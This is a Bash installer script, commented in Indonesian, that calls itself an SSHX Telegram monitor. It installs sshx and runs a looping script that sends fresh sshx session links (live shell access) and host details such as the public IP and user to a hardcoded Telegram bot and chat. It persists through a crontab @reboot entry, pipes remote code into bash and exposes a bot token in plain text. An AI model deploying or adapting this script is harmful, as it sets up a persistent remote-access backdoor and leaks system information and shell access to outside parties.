#!/bin/bash

# ============================================
# SSHX Telegram Monitor - Auto Installer
# ============================================
# Cara pakai: 
# bash -c "$(curl -fsSL https://raw.githubusercontent.com/username/repo/main/sshx-telegram-installer.sh)"
# ============================================

set -e  # Exit jika ada error

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ============================================
# Konfigurasi Telegram
# ============================================
BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"
REPORT_INTERVAL=3600  # 1 jam dalam detik

# ============================================
# Fungsi Logging
# ============================================
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_step() {
    echo -e "${BLUE}[STEP]${NC} $1"
}

# ============================================
# Fungsi Deteksi OS
# ============================================
detect_os() {
    log_step "Mendeteksi sistem operasi..."
    
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VER=$VERSION_ID
    else
        OS=$(uname -s)
        VER=$(uname -r)
    fi
    
    case $OS in
        ubuntu|debian)
            PKG_MANAGER="apt-get"
            INSTALL_CMD="apt-get install -y"
            log_info "Deteksi: Ubuntu/Debian"
            ;;
        centos|rhel|fedora)
            PKG_MANAGER="yum"
            INSTALL_CMD="yum install -y"
            [ -f /etc/fedora-release ] && PKG_MANAGER="dnf" && INSTALL_CMD="dnf install -y"
            log_info "Deteksi: CentOS/RHEL/Fedora"
            ;;
        alpine)
            PKG_MANAGER="apk"
            INSTALL_CMD="apk add"
            log_info "Deteksi: Alpine Linux"
            ;;
        arch)
            PKG_MANAGER="pacman"
            INSTALL_CMD="pacman -S --noconfirm"
            log_info "Deteksi: Arch Linux"
            ;;
        *)
            log_error "OS tidak dikenal: $OS"
            exit 1
            ;;
    esac
    
    echo "OS=$OS" > /tmp/sshx_os_detected
    echo "PKG_MANAGER=$PKG_MANAGER" >> /tmp/sshx_os_detected
}

# ============================================
# Fungsi Install Dependencies
# ============================================
install_dependencies() {
    log_step "Menginstall dependencies yang diperlukan..."
    
    # Update package list
    if [ "$PKG_MANAGER" = "apt-get" ]; then
        apt-get update -y
    elif [ "$PKG_MANAGER" = "yum" ] || [ "$PKG_MANAGER" = "dnf" ]; then
        $PKG_MANAGER update -y
    fi
    
    # Install curl (penting untuk download)
    if ! command -v curl &> /dev/null; then
        log_info "Menginstall curl..."
        $INSTALL_CMD curl
    fi
    
    # Install tmux
    if ! command -v tmux &> /dev/null; then
        log_info "Menginstall tmux..."
        $INSTALL_CMD tmux
    else
        log_info "tmux sudah terinstall"
    fi
    
    # Install jq (untuk parsing JSON)
    if ! command -v jq &> /dev/null; then
        log_info "Menginstall jq..."
        $INSTALL_CMD jq
    fi
    
    # Install sshx (via curl)
    if ! command -v sshx &> /dev/null; then
        log_info "Menginstall sshx..."
        curl -fsSL https://sshx.io/get | bash
        export PATH=$PATH:$HOME/.sshx/bin
    else
        log_info "sshx sudah terinstall"
    fi
    
    log_info "Semua dependencies terinstall"
}

# ============================================
# Fungsi Kirim ke Telegram
# ============================================
send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=HTML" > /dev/null
}

# ============================================
# Fungsi Buat Script Monitor
# ============================================
create_monitor_script() {
    log_step "Membuat script monitor..."
    
    cat > /usr/local/bin/sshx-telegram-monitor.sh << 'EOF'
#!/bin/bash

# ============================================
# SSHX Telegram Monitor - Core Script
# ============================================

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"
REPORT_INTERVAL=3600  # 1 jam

# Load OS info
source /tmp/sshx_os_detected 2>/dev/null || echo "OS=unknown"

# Fungsi kirim Telegram
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$1" \
        -d "parse_mode=HTML" > /dev/null
}

# Fungsi dapatkan info sistem lengkap
get_system_info() {
    HOSTNAME=$(hostname)
    USER=$(whoami)
    UPTIME=$(uptime | sed 's/.*up //; s/,.*//')
    IP_PUBLIC=$(curl -s ifconfig.me || echo "Unknown")
    IP_LOCAL=$(hostname -I | awk '{print $1}')
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    MEM_TOTAL=$(free -h | grep Mem | awk '{print $2}')
    MEM_USED=$(free -h | grep Mem | awk '{print $3}')
    DISK=$(df -h / | awk 'NR==2 {print $5}')
    DATE=$(date "+%Y-%m-%d %H:%M:%S")
    
    echo "🖥️ <b>SYSTEM INFO</b>
━━━━━━━━━━━━━━━━━━━━━
• Hostname: $HOSTNAME
• User: $USER
• Uptime: $UPTIME
• IP Public: $IP_PUBLIC
• IP Local: $IP_LOCAL
• CPU Usage: $CPU%
• Memory: $MEM_USED / $MEM_TOTAL
• Disk Usage: $DISK
• Waktu: $DATE"
}

# Fungsi dapatkan SSHX link
get_sshx_link() {
    # Jalankan sshx dan capture URL
    SSHX_OUTPUT=$(sshx --quiet 2>&1)
    SSHX_URL=$(echo "$SSHX_OUTPUT" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
    echo "$SSHX_URL"
}

# ============================================
# Main Loop
# ============================================
send_telegram "🚀 <b>SSHX Monitor Started</b>
$(get_system_info)
━━━━━━━━━━━━━━━━━━━━━
⏰ Report akan dikirim setiap 1 jam
🔍 Status: Aktif"

# Hitung counter untuk report pertama
COUNTER=0
NEEDS_REPORT=1
LAST_LINK=""

while true; do
    # Dapatkan SSHX link baru
    CURRENT_LINK=$(get_sshx_link)
    
    # Jika link berubah atau belum pernah dapat
    if [ -n "$CURRENT_LINK" ] && [ "$CURRENT_LINK" != "$LAST_LINK" ]; then
        LAST_LINK="$CURRENT_LINK"
        
        # Format pesan link baru
        LINK_MSG="🔗 <b>SSHX SESSION AKTIF</b>
━━━━━━━━━━━━━━━━━━━━━
Link: <code>$CURRENT_LINK</code>
User: $(whoami)
Host: $(hostname)
Time: $(date '+%H:%M:%S')
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Perintah Tersedia:</b>
• ls, df, ps, netstat
• Jalankan perintah via tmux"
        
        send_telegram "$LINK_MSG"
    fi
    
    # Report setiap 1 jam
    if [ $COUNTER -ge $REPORT_INTERVAL ] || [ $NEEDS_REPORT -eq 1 ]; then
        NEEDS_REPORT=0
        COUNTER=0
        
        # Dapatkan status proses
        TMUX_SESSIONS=$(tmux list-sessions 2>/dev/null | wc -l)
        PROCESS_COUNT=$(ps aux | grep sshx | grep -v grep | wc -l)
        
        REPORT_MSG="📊 <b>LAPORAN PERIODIK (1 JAM)</b>
$(get_system_info)
━━━━━━━━━━━━━━━━━━━━━
📡 <b>Status SSHX:</b>
• Link Aktif: $LAST_LINK
• Sesi Tmux: $TMUX_SESSIONS
• Proses SSHX: $PROCESS_COUNT
• Uptime Script: $(ps -p $$ -o etimes= | awk '{printf "%02d:%02d:%02d", $1/3600, ($1%3600)/60, $1%60}')
━━━━━━━━━━━━━━━━━━━━━
✅ <b>Semua Sistem Normal</b>"
        
        send_telegram "$REPORT_MSG"
    fi
    
    sleep 10  # Cek setiap 10 detik
    COUNTER=$((COUNTER + 10))
done
EOF

    chmod +x /usr/local/bin/sshx-telegram-monitor.sh
    log_info "Script monitor dibuat di /usr/local/bin/sshx-telegram-monitor.sh"
}

# ============================================
# Fungsi Setup Tmux & Auto Start
# ============================================
setup_tmux_and_start() {
    log_step "Setup tmux dan auto-start..."
    
    # Kill existing tmux session jika ada
    tmux kill-session -t sshx-monitor 2>/dev/null || true
    
    # Buat tmux session baru
    tmux new-session -d -s sshx-monitor
    
    # Jalankan script monitor di dalam tmux
    tmux send-keys -t sshx-monitor "bash /usr/local/bin/sshx-telegram-monitor.sh" C-m
    
    log_info "Tmux session 'sshx-monitor' telah dibuat"
    log_info "Script monitor berjalan di dalam tmux"
    
    # Setup auto-start on boot (via crontab)
    (crontab -l 2>/dev/null | grep -v "sshx-telegram-monitor"; echo "@reboot tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'") | crontab -
    
    log_info "Auto-start via crontab telah ditambahkan"
}

# ============================================
# Fungsi Info Cara Pakai
# ============================================
show_usage_info() {
    cat << EOF

${GREEN}╔════════════════════════════════════════════════════════╗
║            INSTALASI SELESAI! 🎉                        ║
╚════════════════════════════════════════════════════════╝${NC}

${BLUE}📋 INFORMASI PENTING:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Bot Token: ${YELLOW}8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA${NC}
• Chat ID: ${YELLOW}-1003847935504${NC}
• Report Interval: ${YELLOW}1 Jam${NC}

${GREEN}✅ STATUS:${NC}
• Script monitor sudah berjalan di dalam tmux
• Akan restart otomatis jika server reboot
• Mengirim report ke Telegram setiap 1 jam

${BLUE}📌 PERINTAH PENTING:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• ${YELLOW}Lihat output langsung:${NC}
  tmux attach -t sshx-monitor
  (Tekan Ctrl+B lalu D untuk keluar tanpa stop)

• ${YELLOW}Lihat log:${NC}
  tail -f /tmp/sshx-monitor.log

• ${YELLOW}Restart monitor:${NC}
  tmux kill-session -t sshx-monitor
  tmux new-session -d -s sshx-monitor 'bash /usr/local/bin/sshx-telegram-monitor.sh'

• ${YELLOW}Stop monitor:${NC}
  tmux kill-session -t sshx-monitor
  crontab -e  # Hapus baris @reboot

${BLUE}📱 CEK TELEGRAM:${NC}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Buka grup SSHX di Telegram, Anda akan menerima:
1. Notifikasi start
2. Link SSHX setiap sesi baru
3. Report lengkap setiap 1 jam

${GREEN}🎉 INSTALASI BERHASIL! Script berjalan di background.${NC}
EOF
}

# ============================================
# Main Execution
# ============================================
main() {
    clear
    echo "${BLUE}╔════════════════════════════════════════════════════════╗"
    echo "║        SSHX TELEGRAM MONITOR - AUTO INSTALLER         ║"
    echo "╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Deteksi OS
    detect_os
    
    # Install semua dependencies
    install_dependencies
    
    # Buat script monitor
    create_monitor_script
    
    # Setup tmux dan start
    setup_tmux_and_start
    
    # Kirim notifikasi ke Telegram
    log_step "Mengirim notifikasi ke Telegram..."
    
    HOSTNAME=$(hostname)
    IP=$(curl -s ifconfig.me)
    
    send_telegram "✅ <b>INSTALASI SSHX MONITOR SELESAI</b>
━━━━━━━━━━━━━━━━━━━━━
• Hostname: $HOSTNAME
• IP: $IP
• Waktu: $(date)
• Status: Aktif di tmux
━━━━━━━━━━━━━━━━━━━━━
📊 Report akan dikirim setiap 1 jam"
    
    # Tampilkan info
    show_usage_info
    
    log_info "Instalasi selesai! Monitor berjalan di tmux session 'sshx-monitor'"
}

# Jalankan main function
main

# Exit sukses
exit 0
